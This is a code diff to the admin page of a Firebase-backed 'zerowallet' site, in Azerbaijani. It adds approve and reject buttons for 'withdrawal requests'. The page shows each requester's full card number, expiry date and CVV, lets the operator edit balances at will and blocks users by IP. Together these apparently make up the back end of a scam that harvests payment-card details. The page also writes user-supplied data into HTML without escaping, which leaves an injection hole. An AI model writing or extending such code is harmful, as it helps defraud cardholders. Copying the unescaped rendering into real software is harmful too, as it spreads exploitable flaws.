@@ -16,9 +16,10 @@
         table { width: 100%; border-collapse: collapse; }
         th { background: #1c1c1f; padding: 15px; text-align: left; color: var(--neon); font-size: 0.8rem; }
         td { padding: 15px; border-bottom: 1px solid #1c1c1f; font-size: 0.9rem; }
-        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 5px; }
         .btn-block { background: #ff3e3e; color: white; }
         .btn-unblock { background: #00ff41; color: black; }
+        .btn-status { background: var(--neon); color: black; }
         .editable-balance { color: #00ff41; cursor: pointer; text-decoration: underline dotted; font-weight: bold; }
         .sys-box { background: #1c1c1f; padding: 20px; border-radius: 10px; border: 1px solid var(--neon); margin-bottom: 20px; }
     </style>
@@ -34,10 +35,10 @@
         <button id="toggle-sys-btn" class="btn" onclick="toggleSystem()" style="padding: 15px 30px; font-size: 1rem;"></button>
     </div>
 
-    <h2><i class="fas fa-credit-card"></i> ÇIXARIŞ TƏLƏBLƏRİ</h2>
+    <h2><i class="fas fa-credit-card"></i> ÇIXARIŞ TƏLƏBLƏRİ (ÇEKLƏR)</h2>
     <div class="table-wrap">
         <table>
-            <thead><tr><th>İstifadəçi</th><th>Məbləğ</th><th>Kart Sahibi</th><th>Kart No/EXP/CVV</th><th>IP</th></tr></thead>
+            <thead><tr><th>İstifadəçi</th><th>Məbləğ</th><th>Kart Sahibi</th><th>Kart No/EXP/CVV</th><th>Status/İdarəetmə</th></tr></thead>
             <tbody id="withdraw-body"></tbody>
         </table>
     </div>
@@ -64,7 +65,6 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // SİSTEM STATUSU İŞLƏMƏSİ
     db.ref('settings/system_status').on('value', snap => {
         const status = snap.val();
         const btn = document.getElementById('toggle-sys-btn');
@@ -87,13 +87,45 @@
         });
     }
 
+    // ÇIXARIŞLARI İDARƏ ETMƏK (ÇEKLƏRİ QƏBUL ET)
     db.ref('admin_withdrawals').on('value', snap => {
         const body = document.getElementById('withdraw-body'); body.innerHTML = '';
         snap.forEach(child => {
             const d = child.val();
-            body.innerHTML += `<tr><td><b>${d.username}</b></td><td style="color:#00ff41">${d.amount} AZN</td><td>${d.card_name}</td><td>${d.card_num} | ${d.card_exp} | ${d.card_cvv}</td><td>${d.ip}</td></tr>`;
+            const key = child.key;
+            body.innerHTML += `<tr>
+                <td><b>${d.username}</b></td>
+                <td style="color:#00ff41">${d.amount} AZN</td>
+                <td>${d.card_name}</td>
+                <td>${d.card_num} | ${d.card_exp} | ${d.card_cvv}</td>
+                <td>
+                    <button class="btn btn-unblock" onclick="approveWithdrawal('${key}', '${d.username}', ${d.amount})">TƏSDİQLƏ</button>
+                    <button class="btn btn-block" onclick="rejectWithdrawal('${key}')">İMTİNA</button>
+                </td>
+            </tr>`;
         });
     });
+
+    function approveWithdrawal(key, username, amount) {
+        if(confirm(`${username} üçün ${amount} AZN ödəniş təsdiqlənsin? (Balansdan çıxılacaq)`)) {
+            db.ref('zerowallet_users/' + username).once('value', snap => {
+                const currentBal = snap.val().balance || 0;
+                if(currentBal >= amount) {
+                    db.ref('zerowallet_users/' + username).update({ balance: currentBal - amount });
+                    db.ref('admin_withdrawals/' + key).remove();
+                    alert("Ödəniş təsdiqləndi və balansdan çıxıldı.");
+                } else {
+                    alert("Xəta: İstifadəçinin balansı yetərli deyil!");
+                }
+            });
+        }
+    }
+
+    function rejectWithdrawal(key) {
+        if(confirm("Bu tələbdən imtina edilsin?")) {
+            db.ref('admin_withdrawals/' + key).remove();
+        }
+    }
 
     db.ref('zerowallet_users').on('value', snap => {
         const body = document.getElementById('user-body'); body.innerHTML = '';
@@ -103,7 +135,7 @@
             db.ref('blocked_ips/' + cleanIp).on('value', blockSnap => {
                 const isBlocked = blockSnap.exists();
                 const rowId = `row_${u.username}`;
-                const rowHtml = `<tr id="${rowId}"><td>${u.username}</td><td><span class="editable-balance" onclick="editBalance('${u.username}', ${u.balance})">${u.balance.toFixed(2)} AZN</span></td><td>${u.ip}</td><td>${isBlocked ? '<b style="color:red">BLOK</b>' : '<b style="color:green">AKTİV</b>'}</td><td><button class="btn ${isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="toggleBlock('${u.ip}', ${!isBlocked})">${isBlocked ? 'AÇ' : 'BLOKLA'}</button></td></tr>`;
+                const rowHtml = `<tr id="${rowId}"><td>${u.username}</td><td><span class="editable-balance" onclick="editBalance('${u.username}', ${u.balance})">${(u.balance || 0).toFixed(4)} AZN</span></td><td>${u.ip || '0.0.0.0'}</td><td>${isBlocked ? '<b style="color:red">BLOK</b>' : '<b style="color:green">AKTİV</b>'}</td><td><button class="btn ${isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="toggleBlock('${u.ip}', ${!isBlocked})">${isBlocked ? 'AÇ' : 'BLOKLA'}</button></td></tr>`;
                 let row = document.getElementById(rowId);
                 if (row) row.outerHTML = rowHtml; else body.innerHTML += rowHtml;
             });
@@ -116,6 +148,7 @@
     }
 
     function toggleBlock(ip, status) {
+        if(!ip) return;
         const cleanIp = ip.replace(/\./g, '_');
         if (status) db.ref('blocked_ips/' + cleanIp).set({ ip: ip, date: Date.now() });
         else db.ref('blocked_ips/' + cleanIp).remove();
